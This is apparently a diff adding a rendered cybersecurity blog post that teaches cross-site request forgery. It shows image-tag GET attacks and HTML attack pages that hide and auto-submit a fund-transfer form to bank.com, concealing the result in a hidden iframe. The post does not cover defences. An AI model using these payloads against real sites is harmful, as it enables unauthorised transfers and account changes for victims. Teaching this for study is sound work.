@@ -1,0 +1,110 @@
+I"�;<h2 id="background">Background</h2>
+
+<p>In the realm of cybersecurity, virtualization plays a crucial role by enabling the creation of isolated virtual environments within a single physical computer. This technology allows for the development of distinct virtual machines, each equipped with its own virtual Central Processing Unit (CPU), Graphics Processing Unit (GPU), Random Access Memory (RAM), Network Interface Card (NIC), storage (HDD, SSD), and input peripherals such as a mouse and keyboard.</p>
+
+<p>The significance of virtualization in cybersecurity lies in its ability to conduct various tasks within these isolated virtual machines, all without compromising the security of the underlying physical machine’s operating system. To achieve this, a hypervisor, a specialized software component, must be installed within the host machine’s operating system. The hypervisor facilitates hardware virtualization services, ensuring the secure and efficient operation of the virtual environments.</p>
+
+<h2 id="setting-up-your-virtual-environment">Setting up your Virtual Environment</h2>
+
+<p><img src="/img/posts/VirtualEnvironment.jpg" alt="IMDb page" /></p>
+
+<p>In the cybersecurity context, we have outlined instructions for two widely used virtual environments: VirtualBox and Docker. To initiate the process, opt for either Method #1, which involves configuring VirtualBox and Kali, or Method #2, centered around Docker and Kali.</p>
+
+<h2 id="understanding-the-dynamics-of-csrf-attacks-via-get-requests">Understanding the Dynamics of CSRF Attacks via GET Requests</h2>
+
+<p>A basic CSRF attack involves deceiving a user into initiating a GET request to a particular URL. Achieving this can be as straightforward as embedding the URL within a link that carries a misleading name. This deceptive link might be strategically placed in various locations, such as a blog comment (a method commonly exploited in WordPress vulnerabilities), a post on an online forum, or even within a phishing email.</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="o">&lt;</span><span class="n">img</span> <span class="n">src</span><span class="o">=</span><span class="s">"http://hackermag.com/best_hacker/vote/48576"</span> <span class="o">/&gt;</span>
+</code></pre></div></div>
+
+<p>Upon loading a page, the browser autonomously generates separate requests to fetch all images embedded in the HTML. In the context of a user viewing a forum page containing the mentioned image within a user post, the browser initiates a GET request to the corresponding URL. Importantly, no user interaction is required, as the potential harm occurs during the browser’s interpretation of the HTML, without the need for the user to click any links.</p>
+
+<h2 id="csrf-get-request-with-user-authentication">CSRF GET Request with User Authentication</h2>
+
+<p>The primary risk of a CSRF attack emerges when the targeted URL directs to a page on a website requiring user authentication, and the user’s browser maintains their prior authentication state. The exploit capitalizes on the authenticated state stored in the browser.</p>
+
+<p>Consider a scenario where a user logs into their bank website. The bank sets a cookie in the user’s browser, signifying authorized access. Subsequent requests to any page on the bank’s site include this cookie as proof of authorization.</p>
+
+<p>This process is akin to attending a concert, receiving a wristband upon payment or ticket presentation. The wristband serves as proof of authorized status: Wristband equals authorized; no wristband equals not authorized.</p>
+
+<p>Now, envision the user concluding their banking activities, closing the browser window without logging out. The user’s browser still retains the bank authorization cookie – it still wears the wristband.</p>
+
+<p>If an attacker manages to manipulate the user into making a request to the bank’s website, the request carries the cookie with authorization, and the server considers it authenticated. From the bank’s perspective, this appears as just another routine request from the user’s browser.</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="n">img</span> <span class="n">src</span><span class="o">=</span><span class="s">"https://bank.com/transfer?amount=10000&amp;to_account=2468013579"</span> <span class="o">/&gt;</span>
+</code></pre></div></div>
+
+<p>Should a user load a page featuring the provided image tag, it initiates a <code class="language-plaintext highlighter-rouge">GET</code> request to the URL indicated in the <code class="language-plaintext highlighter-rouge">src</code> attribute. In this situation, an unauthenticated user would be directed to bank.com’s login page. However, for a user who was authenticated previously, access might be granted if the request is acknowledged by <code class="language-plaintext highlighter-rouge">bank.com</code>.</p>
+
+<p>CSRF attacks can manifest in various actions, with some prevalent examples being:</p>
+
+<ul>
+  <li>Altering the password</li>
+  <li>Modifying the email address</li>
+  <li>Logging into a site</li>
+  <li>Initiating fund transfers</li>
+  <li>Downloading malware</li>
+</ul>
+
+<h2 id="exploiting-security-csrf-post-request-attack">Exploiting Security: CSRF POST Request Attack</h2>
+
+<p><code class="language-plaintext highlighter-rouge">GET</code> requests aren’t the sole method for initiating a CSRF attack. An alternative approach involves an attacker fabricating a form. Breaking down the process step by step can provide clarity on the construction of such an attack.</p>
+
+<p>Consider a scenario where an attacker conducts research to understand the appearance of a genuine bank.</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="n">html</span><span class="o">&gt;</span>
+  <span class="o">&lt;</span><span class="n">head</span><span class="o">&gt;</span>
+    <span class="o">&lt;</span><span class="n">title</span><span class="o">&gt;</span><span class="nc">Bank</span> <span class="nc">Website</span><span class="o">&lt;/</span><span class="n">title</span><span class="o">&gt;</span>
+  <span class="o">&lt;/</span><span class="n">head</span><span class="o">&gt;</span>
+  <span class="o">&lt;</span><span class="n">body</span><span class="o">&gt;</span>
+    <span class="o">&lt;</span><span class="n">form</span> <span class="n">action</span><span class="o">=</span><span class="s">"http://bank.com/transfer"</span> <span class="n">method</span><span class="o">=</span><span class="s">"POST"</span> <span class="n">name</span><span class="o">=</span><span class="s">"bank_form"</span><span class="o">&gt;</span>
+      <span class="o">&lt;</span><span class="n">input</span> <span class="n">type</span><span class="o">=</span><span class="s">"text"</span> <span class="n">name</span><span class="o">=</span><span class="s">"amount"</span> <span class="n">value</span><span class="o">=</span><span class="s">""</span> <span class="o">/&gt;</span>
+      <span class="o">&lt;</span><span class="n">input</span> <span class="n">type</span><span class="o">=</span><span class="s">"text"</span> <span class="n">name</span><span class="o">=</span><span class="s">"to_account"</span> <span class="n">value</span><span class="o">=</span><span class="s">""</span> <span class="o">/&gt;</span>
+      <span class="o">&lt;</span><span class="n">input</span> <span class="n">type</span><span class="o">=</span><span class="s">"submit"</span> <span class="n">value</span><span class="o">=</span><span class="s">"submit"</span> <span class="o">/&gt;</span>
+    <span class="o">&lt;/</span><span class="n">form</span><span class="o">&gt;</span>
+  <span class="o">&lt;/</span><span class="n">body</span><span class="o">&gt;</span>
+<span class="o">&lt;/</span><span class="n">html</span><span class="o">&gt;&gt;</span>
+</code></pre></div></div>
+<p>The attacker can embed that HTML into a different page and deceive a user into submitting the form. This method can bypass any “allow POST requests only” safeguards that may be implemented, as it involves a <code class="language-plaintext highlighter-rouge">POST</code> request. Similar to a <code class="language-plaintext highlighter-rouge">GET</code> request, this <code class="language-plaintext highlighter-rouge">POST</code> request transmits any authorization cookies.</p>
+
+<p>To accomplish this, the attacker simply needs to discover a means of tricking a user into submitting the concealed form. This can be achieved by employing CSS to hide the form and then utilizing JavaScript to automatically submit the form upon page loading.</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="n">html</span><span class="o">&gt;</span>
+  <span class="o">&lt;</span><span class="n">head</span><span class="o">&gt;</span>
+    <span class="o">&lt;</span><span class="n">title</span><span class="o">&gt;</span><span class="nc">Fake</span> <span class="nc">Form</span><span class="o">&lt;/</span><span class="n">title</span><span class="o">&gt;</span>
+  <span class="o">&lt;/</span><span class="n">head</span><span class="o">&gt;</span>
+  <span class="o">&lt;</span><span class="n">body</span> <span class="n">onload</span><span class="o">=</span><span class="s">"document.bank_form.submit()"</span><span class="o">&gt;</span>
+    <span class="o">&lt;</span><span class="n">form</span> <span class="n">action</span><span class="o">=</span><span class="s">"http://bank.com/transfer"</span> <span class="n">method</span><span class="o">=</span><span class="s">"POST"</span> <span class="n">name</span><span class="o">=</span><span class="s">"bank_form"</span> <span class="n">style</span><span class="o">=</span><span class="s">"display: none;"</span><span class="o">&gt;</span>
+      <span class="o">&lt;</span><span class="n">input</span> <span class="n">type</span><span class="o">=</span><span class="s">"text"</span> <span class="n">name</span><span class="o">=</span><span class="s">"amount"</span> <span class="n">value</span><span class="o">=</span><span class="s">"10000"</span> <span class="o">/&gt;</span>
+      <span class="o">&lt;</span><span class="n">input</span> <span class="n">type</span><span class="o">=</span><span class="s">"text"</span> <span class="n">name</span><span class="o">=</span><span class="s">"to_account"</span> <span class="n">value</span><span class="o">=</span><span class="s">"2468013579"</span> <span class="o">/&gt;</span>
+    <span class="o">&lt;/</span><span class="n">form</span><span class="o">&gt;</span>
+  <span class="o">&lt;/</span><span class="n">body</span><span class="o">&gt;</span>
+<span class="o">&lt;/</span><span class="n">html</span><span class="o">&gt;</span>
+</code></pre></div></div>
+
+<p>Take note that the body incorporates an <code class="language-plaintext highlighter-rouge">onload</code> attribute, prompting an immediate form submission, while the form employs a <code class="language-plaintext highlighter-rouge">style</code> attribute to keep itself hidden.</p>
+
+<p>This process doesn’t necessitate the user to click “Submit”; in fact, there isn’t even a submit button on the form. Persuading a user to visit this page is adequate to trigger the request, and accomplishing this can be as simple as embedding a deceptive link in a phishing email.</p>
+
+<p>However, there is a potential issue with this attack. After the form submission, the user might witness the outcomes, like a page on the bank’s website confirming a “Funds transfer complete.” If a user observes this, they may grow suspicious and likely contact their bank to annul the transaction.</p>
+
+<p>To counter this, an attacker must conceal the results. Forms facilitate the transmission of their outcomes to an <code class="language-plaintext highlighter-rouge">iframe</code> by utilizing a <code class="language-plaintext highlighter-rouge">target</code> attribute.</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="n">html</span><span class="o">&gt;</span>
+  <span class="o">&lt;</span><span class="n">head</span><span class="o">&gt;</span>
+    <span class="o">&lt;</span><span class="n">title</span><span class="o">&gt;</span><span class="nc">Fake</span> <span class="nc">Form</span><span class="o">&lt;/</span><span class="n">title</span><span class="o">&gt;</span>
+  <span class="o">&lt;/</span><span class="n">head</span><span class="o">&gt;</span>
+  <span class="o">&lt;</span><span class="n">body</span> <span class="n">onload</span><span class="o">=</span><span class="s">"document.bank_form.submit()"</span><span class="o">&gt;</span>
+    <span class="o">&lt;</span><span class="n">form</span> <span class="n">action</span><span class="o">=</span><span class="s">"http://bank.com/transfer"</span> <span class="n">method</span><span class="o">=</span><span class="s">"POST"</span> <span class="n">name</span><span class="o">=</span><span class="s">"bank_form"</span> <span class="n">style</span><span class="o">=</span><span class="s">"display: none;"</span> <span class="n">target</span><span class="o">=</span><span class="s">"hidden_results"</span> <span class="o">&gt;</span>
+      <span class="o">&lt;</span><span class="n">input</span> <span class="n">type</span><span class="o">=</span><span class="s">"text"</span> <span class="n">name</span><span class="o">=</span><span class="s">"amount"</span> <span class="n">value</span><span class="o">=</span><span class="s">"10000"</span> <span class="o">/&gt;</span>
+      <span class="o">&lt;</span><span class="n">input</span> <span class="n">type</span><span class="o">=</span><span class="s">"text"</span> <span class="n">name</span><span class="o">=</span><span class="s">"to_account"</span> <span class="n">value</span><span class="o">=</span><span class="s">"2468013579"</span> <span class="o">/&gt;</span>
+    <span class="o">&lt;/</span><span class="n">form</span><span class="o">&gt;</span>
+    <span class="o">&lt;</span><span class="n">iframe</span> <span class="n">name</span><span class="o">=</span><span class="s">"hidden_results"</span> <span class="n">style</span><span class="o">=</span><span class="s">"display: none;"</span><span class="o">&gt;&lt;/</span><span class="n">iframe</span><span class="o">&gt;</span>
+  <span class="o">&lt;/</span><span class="n">body</span><span class="o">&gt;</span>
+<span class="o">&lt;/</span><span class="n">html</span><span class="o">&gt;</span>
+</code></pre></div></div>
+
+<p>Observe the inclusion of the <code class="language-plaintext highlighter-rouge">iframe</code> tag, set to “<code class="language-plaintext highlighter-rouge">display: none</code>,” and the addition of a new <code class="language-plaintext highlighter-rouge">target</code> attribute to the <code class="language-plaintext highlighter-rouge">form</code> tag.</p>
+
+<p>By concealing an <code class="language-plaintext highlighter-rouge">iframe</code> and directing the form results to it, the user will remain unaware that a CSRF attack has transpired.</p>
+:ET
